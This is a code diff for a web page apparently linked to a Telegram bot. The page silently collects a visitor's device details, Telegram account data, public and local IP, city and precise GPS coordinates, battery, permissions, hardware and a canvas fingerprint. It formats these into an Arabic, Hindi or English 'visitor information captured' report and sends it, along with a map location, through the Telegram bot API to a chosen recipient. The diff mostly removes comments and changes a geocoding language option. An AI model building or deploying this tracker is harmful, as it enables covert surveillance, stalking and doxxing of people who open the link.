@@ -249,9 +249,10 @@
                 }
             }
 
+            // 🚨 التعديل هنا: خلي لغة المكتبة تتبع لغة البوت
             if (ipDataGlobal.latitude && ipDataGlobal.longitude) {
                 try {
-                    const bdcRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${ipDataGlobal.latitude}&longitude=${ipDataGlobal.longitude}&localityLanguage=ar`);
+                    const bdcRes = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${ipDataGlobal.latitude}&longitude=${ipDataGlobal.longitude}&localityLanguage=${botLang === 'ar' ? 'ar' : 'en'}`);
                     const bdcData = await bdcRes.json();
                     if (bdcData && bdcData.principalSubdivision) {
                         ipDataGlobal.region = bdcData.principalSubdivision;
@@ -351,7 +352,6 @@
 
                 const ua = navigator.userAgent;
                 
-                // 1. نظام التشغيل
                 let osName = "غير معروف", osNameEn = "Unknown", osNameHi = "अज्ञात";
                 let osVersion = "";
                 if (/Windows/i.test(ua)) { osName = osNameEn = osNameHi = "Windows"; }
@@ -368,7 +368,6 @@
                 else if (/Mac/i.test(ua)) { osName = osNameEn = osNameHi = "macOS"; }
                 else if (/Linux/i.test(ua)) { osName = osNameEn = osNameHi = "Linux"; }
 
-                // 2. المتصفح
                 let browserName = "Unknown";
                 if (/Edg/i.test(ua)) browserName = "Edge";
                 else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
@@ -380,7 +379,6 @@
                 else if (/Instagram/i.test(ua)) browserName = "Instagram";
                 else if (/Telegram/i.test(ua)) browserName = "Telegram";
 
-                // 3. الموديل
                 let deviceModel = "Unknown";
                 const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
                 if (modelMatch) deviceModel = modelMatch[1].trim();
@@ -392,7 +390,6 @@
                     }
                 } catch (e) {}
 
-                // 4. بيانات تليجرام
                 let tgSectionAr = "", tgSectionEn = "", tgSectionHi = "";
                 if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
                     const u = window.Telegram.WebApp.initDataUnsafe.user;
@@ -405,7 +402,6 @@
                     tgSectionHi = `\n👤 टेलीग्राम खाता\n   • नाम: ${tgName}\n   • यूजरनेम: ${tgUsername}\n   • प्रीमियम: ${tgPremium}\n`;
                 }
 
-                // 5. الشبكة
                 let netAr = "غير معروف", netEn = "Unknown", netHi = "अज्ञात";
                 let netDownlink = navigator.connection ? navigator.connection.downlink : "Unknown";
                 let netRtt = navigator.connection ? navigator.connection.rtt : "Unknown";
@@ -421,7 +417,6 @@
                     }
                 }
 
-                // 6. الوقت والشاشة والبطارية
                 let deviceTimezone = "Unknown";
                 try { deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
 
@@ -437,7 +432,6 @@
                     }
                 } catch (e) {}
 
-                // 7. الصلاحيات
                 let camStatus = "Prompt", locStatus = "Prompt";
                 try { camStatus = (await navigator.permissions.query({ name: 'camera' })).state; } catch(e) {}
                 try { locStatus = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch(e) {}
@@ -449,9 +443,9 @@
                 let camHi = camStatus === 'granted' ? 'अनुमति दी गई' : camStatus === 'denied' ? 'अस्वीकृत' : 'संकेत';
                 let locHi = locStatus === 'granted' ? 'अनुमति दी गई' : locStatus === 'denied' ? 'अस्वीकृत' : 'संकेत';
 
-                // 8. الهاردوير
                 const screenRes = `${window.screen.width}x${window.screen.height}`;
                 const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
+
                 const localIp = await getLocalIP();
                 const fingerprint = getCanvasFingerprint();
                 const gpuInfo = getGPU();
@@ -462,7 +456,6 @@
                 let finalRam = deviceInfo.ram;
                 let finalStorage = deviceInfo.storage;
 
-                // 9. الموقع الدقيق
                 let gpsSectionAr = "", gpsSectionEn = "", gpsSectionHi = "";
                 if (gpsData) {
                     gpsSectionAr = `\n📍 الموقع الدقيق (GPS)\n   • المنطقة: ${gpsData.areaName}\n   • خط العرض: ${gpsData.lat}\n   • خط الطول: ${gpsData.lon}\n   • الدقة: ${gpsData.acc} متر\n`;
@@ -472,9 +465,6 @@
 
                 let report = "";
 
-                // ==========================================
-                // بناء الرسائل (عربي / هندي / إنجليزي)
-                // ==========================================
                 if (botLang === 'ar') {
                     report = `📊 تم سحب معلومات الزائر\n━━━━━━━━━━━━━━━━\n\n🖥️ الجهاز والمتصفح\n   • الموديل: ${finalName}\n   • نظام التشغيل: ${osName} ${osVersion}\n   • التطبيق: ${browserName}\n   • كود المتصفح: <code>${ua}</code>\n${tgSectionAr}\n🌐 معلومات الشبكة\n   • الآي بي العام: ${ipDataGlobal.ip || 'غير معروف'}\n   • الآي بي المحلي: ${localIp}\n   • نوع الاتصال: ${netAr}\n   • السرعة: ${netDownlink} Mbps | الاستجابة: ${netRtt} ms\n   • اللغة: ${navigator.language}\n\n📍 تفاصيل الموقع (IP)\n   • الدولة: ${ipDataGlobal.country || 'غير معروف'}\n   • المحافظة: ${ipDataGlobal.region || 'غير معروف'}\n   • المدينة: ${ipDataGlobal.city || 'غير معروف'}\n   • التوقيت: ${deviceTimezone}\n${gpsSectionAr}\n🖼️ معلومات الشاشة\n   • الدقة: ${screenRes}\n   • الاتجاه: ${orientation}\n   • الألوان: ${colorDepth}\n\n🔋 حالة البطارية\n   • المستوى: ${batLevel}%\n   • الشحن: ${isCharging ? 'نعم' : 'لا'}\n\n🔐 الصلاحيات\n   • الكاميرا: ${camAr}\n   • الموقع: ${locAr}\n\n💾 الهاردوير\n   • المعالج: ${cpuCores} نواة\n   • كرت الشاشة: ${gpuInfo}\n   • الرام: ${finalRam}\n   • المساحة: ${finalStorage}\n\n🔏 بصمة الجهاز\n   • ${fingerprint}\n\n━━━━━━━━━━━━━━━━\n⚡ المطور: <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>`;
                 } else if (botLang === 'hi') {
@@ -483,7 +473,6 @@
                     report = `📊 Visitor Information Captured\n━━━━━━━━━━━━━━━━\n\n🖥️ Device & Browser\n   • Device Model: ${finalName}\n   • OS: ${osNameEn} ${osVersion}\n   • App Interface: ${browserName}\n   • User-Agent: <code>${ua}</code>\n${tgSectionEn}\n🌐 Network Information\n   • Public IP: ${ipDataGlobal.ip || 'Unknown'}\n   • Local IP: ${localIp}\n   • Connection Type: ${netEn}\n   • Speed: ${netDownlink} Mbps | RTT: ${netRtt} ms\n   • Language: ${navigator.language}\n\n📍 Location Details (IP)\n   • Country: ${ipDataGlobal.country || 'Unknown'}\n   • Region: ${ipDataGlobal.region || 'Unknown'}\n   • City: ${ipDataGlobal.city || 'Unknown'}\n   • Timezone: ${deviceTimezone}\n${gpsSectionEn}\n🖼️ Display Information\n   • Resolution: ${screenRes}\n   • Orientation: ${orientation}\n   • Color Depth: ${colorDepth}\n\n🔋 Battery Status\n   • Level: ${batLevel}%\n   • Charging: ${isCharging ? 'Yes' : 'No'}\n\n🔐 Device Permissions\n   • Camera: ${camEn}\n   • Location: ${locEn}\n\n💾 Hardware & Storage\n   • CPU Cores: ${cpuCores}\n   • GPU: ${gpuInfo}\n   • RAM: ${finalRam}\n   • Storage: ${finalStorage}\n\n🔏 Device Fingerprint\n   • ${fingerprint}\n\n━━━━━━━━━━━━━━━━\n⚡ Developed by: <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>`;
                 }
 
-                // إرسال الرسالة
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
@@ -494,7 +483,6 @@
                     showAlert("خطأ من تليجرام: " + resData.description + "\nاتأكد إنك عملت Start للبوت الأول.");
                 }
 
-                // إرسال الخريطة في الزرار التاني بس
                 if (gpsData) {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST', headers: { 'Content-Type': 'application/json' },
